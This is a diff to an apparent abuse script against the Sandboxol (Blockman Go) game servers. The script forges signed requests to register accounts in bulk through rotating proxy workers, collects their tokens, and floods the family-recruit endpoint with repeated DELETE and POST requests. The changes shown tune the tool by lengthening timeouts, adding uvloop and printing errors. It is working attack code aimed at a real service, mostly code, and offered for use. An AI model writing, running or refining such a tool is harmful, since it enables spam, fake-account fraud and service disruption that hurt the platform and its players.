@@ -7,6 +7,11 @@ import time
 import re
 
 import aiohttp
+try:
+    import uvloop
+    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+except ImportError:
+    pass
 from Crypto.Cipher import AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
@@ -214,11 +219,10 @@ async def cr(session, lock):
             android_sign = get_android_sign(android_id)
             xtime = str(int(time.time()))
             xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
-            print("e")
             try:
                 async with session.get(
                     f"{random.choice(WORKERS)}https/gw.sandboxol.com/user/api/v5/account/auth-token",
-                    timeout=2,
+                    timeout=5,
                     params={"q":query},
                     headers={
                         "bmg-user-id": "0",
@@ -293,7 +297,7 @@ async def cr(session, lock):
                         xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                         async with session.post(
                             f"{random.choice(WORKERS)}https/gw.sandboxol.com/user/api/v1/user/register",
-                            timeout=2,
+                            timeout=5,
                             data=body_string.encode(),
                             headers={
                                 "bmg-device-id": android_id,
@@ -356,8 +360,8 @@ async def cr(session, lock):
                                 register_time = str(int(answer["data"]["registerTime"]))
                                 async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
                 await asyncio.sleep(0.5)
-            except ImportError:
-                print("b")
+            except Exception as e:
+                print(e)
 
 async def create_accounts(session, lock):
         tasks = [asyncio.create_task(cr(session, lock)) for _ in range(5)]
@@ -397,7 +401,7 @@ async def flood_s(session, lock):
                 try:
                     async with session.delete(
                         f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
-                        timeout=2,
+                        timeout=5,
                         headers={
                             "userId": user_id,
                             "packageName": "official",
@@ -444,7 +448,7 @@ async def flood_s(session, lock):
                     async with session.post(
                         f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                         data=body_string.encode(),
-                        timeout=2,
+                        timeout=5,
                         headers={
                             "language": region,
                             "userId": user_id,
